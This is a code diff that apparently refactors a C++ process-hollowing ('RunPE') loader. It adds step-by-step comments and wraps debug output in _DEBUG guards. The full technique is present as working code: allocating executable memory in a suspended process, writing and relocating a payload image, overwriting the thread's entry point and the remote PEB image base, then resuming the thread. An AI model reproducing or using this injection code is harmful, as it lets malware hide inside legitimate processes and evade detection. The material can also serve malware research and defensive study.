@@ -46,9 +46,12 @@ bool get_remote_context(PROCESS_INFORMATION &pi, CONTEXT &context)
     return GetThreadContext(pi.hThread, &context);
 }
 
-bool update_peb_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, ULONGLONG entry_point_va)
+bool update_remote_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, ULONGLONG entry_point_va)
 {
+#ifdef _DEBUG
     printf("Writing new EP: %x\n", entry_point_va);
+#endif
+
 #if defined(_WIN64)
     context.Rcx = entry_point_va;
 #else
@@ -75,24 +78,32 @@ ULONGLONG get_remote_peb_addr(const CONTEXT &context)
 
 bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, CONTEXT &context)
 {
+    //1. Calculate VA of the payload's EntryPoint
     DWORD ep = get_entry_point_rva(loaded_pe);
     ULONGLONG ep_va = (ULONGLONG)load_base + ep;
-    if (!update_peb_entry_point(pi, context, ep_va)) {
-        printf("Cannot update PEB!\n");
+
+    //2. Write the new Entry Point into context of the remote process:
+    if (!update_remote_entry_point(pi, context, ep_va)) {
+        printf("Cannot update remote EP!\n");
         return false;
     }
-    ULONGLONG peb_addr = get_remote_peb_addr(context);
-    PEB* remote_peb = (PEB*) peb_addr;
+    //3. Get access to the remote PEB:
+    ULONGLONG remote_peb_addr = get_remote_peb_addr(context);
+    if (!remote_peb_addr) {
+        printf("Failed getting remote PEB address!\n");
+        return false;
+    }
+    PEB* remote_peb = (PEB*) remote_peb_addr;
     LPVOID remote_img_base = &(remote_peb->ImageBaseAddress);
-
+#ifdef _DEBUG
     printf("Remote PEB: %p\n", remote_peb);
-    printf("Remote img_base: %p\n", remote_img_base);
-
+#endif
     SIZE_T written = 0;
     const size_t img_base_size = sizeof(PVOID);
-
+#ifdef _DEBUG
     printf("ImageBaseSize: %d\n", img_base_size);
-
+#endif
+    //4. Write the payload's ImageBase into remote process' PEB:
     if (!WriteProcessMemory(pi.hProcess, remote_img_base, 
         &load_base, img_base_size, 
         &written)) 
@@ -107,55 +118,50 @@ bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi)
 {
     if (loaded_pe == NULL) return false;
 
+    //1. Get the context of the suspended process:
     CONTEXT context = { 0 };
     if (!get_remote_context(pi, context)) {
         printf("Getting remote context failed!\n");
         return false;
     }
-    ULONGLONG remote_peb_addr = get_remote_peb_addr(context);
-    if (!remote_peb_addr) {
-        printf("Failed getting remote PEB address!\n");
-        return false;
-    }
-    PEB peb = { 0 };
-    if (!read_remote_mem(pi.hProcess, remote_peb_addr, &peb, sizeof(PEB))) {
-        printf("Failed reading remote PEB!\n");
-        return false;
-    }
-#ifdef _DEBUG
-    printf("targetImageBase = %x\n", peb.ImageBaseAddress);
-#endif
 
-    //try to allocate space that will be the most suitable for the payload:
-    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (remoteAddress == NULL)  {
+    //2. Allocate memory for the payload in the remote process:
+    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (remoteBase == NULL)  {
         printf("Could not allocate memory in the remote process\n");
         return false;
     }
-    printf("Allocated remote ImageBase: %p size: %lx\n", remoteAddress, static_cast<ULONG>(payloadImageSize));
-    
-    bool is_ok = relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteAddress);
-    if (!is_ok) {
+#ifdef _DEBUG
+    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast<ULONG>(payloadImageSize));
+#endif
+    //3. Relocate the payload (local copy) to the Remote Base:
+    if (!relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteBase)) {
         printf("Could not relocate the module!\n");
         return false;
     }
+    //4. Guarantee that the subsystem of the payload is GUI:
     set_subsystem(loaded_pe, IMAGE_SUBSYSTEM_WINDOWS_GUI);
-    update_image_base(loaded_pe, (ULONGLONG)remoteAddress);
+
+    //5. Update the image base of the payload (local copy) to the Remote Base:
+    update_image_base(loaded_pe, (ULONGLONG) remoteBase);
 
 #ifdef _DEBUG
     printf("Writing to remote process...\n");
 #endif
+    //6. Write the payload to the remote process, at the Remote Base:
     SIZE_T written = 0;
-    if (!WriteProcessMemory(pi.hProcess, remoteAddress, loaded_pe, payloadImageSize, &written)) {
+    if (!WriteProcessMemory(pi.hProcess, remoteBase, loaded_pe, payloadImageSize, &written)) {
         return false;
     }
 #ifdef _DEBUG
     printf("Loaded at: %p\n", loaded_pe);
 #endif
-    if (!redirect_to_payload(loaded_pe, remoteAddress, pi, context)) {
+    //7. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
+    if (!redirect_to_payload(loaded_pe, remoteBase, pi, context)) {
         printf("Redirecting failed!\n");
         return false;
     }
+    //8. Resume the thread and let the payload run:
     ResumeThread(pi.hThread);
     return true;
 }
